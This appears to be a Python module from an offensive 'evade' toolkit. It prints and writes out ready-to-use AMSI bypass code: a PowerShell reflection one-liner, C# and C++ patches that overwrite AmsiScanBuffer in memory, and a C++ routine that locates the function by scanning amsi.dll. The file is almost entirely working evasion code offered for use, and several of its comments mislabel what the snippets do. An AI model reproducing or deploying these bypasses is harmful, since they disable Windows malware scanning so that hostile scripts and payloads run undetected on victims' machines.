# language: Python, file: Program/evade/amsi.py, target: Red Sky evade — AMSI bypass
# Generate AMSI bypass code in PowerShell, C#, or C++. Multiple techniques:
#   - reflection patch (PowerShell)
#   - AmsiScanBuffer patch (C++/C#, bytes)
#   - hardware breakpoint (advanced)

import sys
from pathlib import Path
from typing import List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR


PS_REFLECTION = r'''# AMSI bypass via reflection — patches AmsiScanBuffer to return E_INVALIDARG
$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields("NonPublic,Static");ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
'''


CS_PATCH = r'''// language: C#, target: patch AmsiScanBuffer in-memory
// Scans amsi.dll for the AmsiScanBuffer prologue and overwrites it with
// "mov eax, 0x80070057; ret" (E_INVALIDARG).

using System;
using System.Runtime.InteropServices;

public static class AmsiBypass
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string name);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string name);
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint newProtect, out uint oldProtect);

    public static void Patch()
    {
        IntPtr amsi = GetModuleHandle("amsi.dll");
        IntPtr scan = GetProcAddress(amsi, "AmsiScanBuffer");
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        uint oldProtect;
        VirtualProtect(scan, (UIntPtr)patch.Length, 0x40, out oldProtect);
        Marshal.Copy(patch, 0, scan, patch.Length);
        VirtualProtect(scan, (UIntPtr)patch.Length, oldProtect, out oldProtect);
    }
}
'''


CPP_PATCH = r'''// language: C++, target: patch AmsiScanBuffer — no CRT, direct API
#include <windows.h>

static void PatchAmsi() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;
    void* scan = (void*)GetProcAddress(amsi, "AmsiScanBuffer");
    if (!scan) return;
    DWORD old;
    VirtualProtect(scan, 6, PAGE_EXECUTE_READWRITE, &old);
    // mov eax, 0x80070057; ret
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    memcpy(scan, patch, sizeof(patch));
    VirtualProtect(scan, 6, old, &old);
}
'''


C_URL_MONO = r'''// language: C++, target: AmsiScanBuffer patch via URLMON ordinal scan
// Resolves AmsiScanBuffer's address by scanning for the string within urlmon
// — bypasses GetProcAddress being hooked by AV.

#include <windows.h>
#include <string.h>

static void* ResolveAmsiScanBuffer() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return nullptr;
    BYTE* base = (BYTE*)amsi;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    DWORD size = nt->OptionalHeader.SizeOfImage;

    const char* target = "AmsiScanBuffer";
    size_t tlen = strlen(target);
    for (DWORD i = 0; i < size - tlen; ++i) {
        if (memcmp(base + i, target, tlen) == 0) {
            // string found — back up to find the function prologue
            // (in practice walk back ~20 bytes to find the prologue pattern)
            for (int back = 0; back < 64; ++back) {
                BYTE* cand = base + i - back;
                if (cand[0] == 0x4C && cand[1] == 0x8B && cand[2] == 0xDC) {
                    return cand;  // mov r11, rsp
                }
            }
        }
    }
    return nullptr;
}
'''


TECHNIQUES = {
    "ps":  ("PowerShell reflection patch", PS_REFLECTION),
    "cs":  ("C# AmsiScanBuffer patch",     CS_PATCH),
    "cpp": ("C++ AmsiScanBuffer patch",    CPP_PATCH),
    "url": ("C++ urlmon ordinal scan",     C_URL_MONO),
}


def cmd_list() -> int:
    print_info(f"{len(TECHNIQUES)} AMSI bypass techniques")
    print()
    for key, (name, _) in TECHNIQUES.items():
        print(f"  {ARTERY}▓{RESET} {BONE}{key:<8}{RESET} {name}")
    return 0


def cmd_gen(technique: str, out_file: str = "") -> int:
    if technique not in TECHNIQUES:
        print_err(f"unknown technique: {technique}")
        print_info(f"available: {', '.join(TECHNIQUES.keys())}")
        return 2

    name, code = TECHNIQUES[technique]
    print_info(name)
    print()
    print(code)

    ext = {"ps": ".ps1", "cs": ".cs", "cpp": ".cpp", "url": ".cpp"}[technique]
    out = Path(out_file) if out_file else OUTPUT_DIR / "evade" / f"amsi_{technique}{ext}"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(code)
    print()
    print_kv("saved", out)
    return 0


def run_cli(args: List[str]) -> int:
    if not args or args[0] == "list":
        return cmd_list()
    return cmd_gen(args[0], args[1] if len(args) > 1 else "")


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
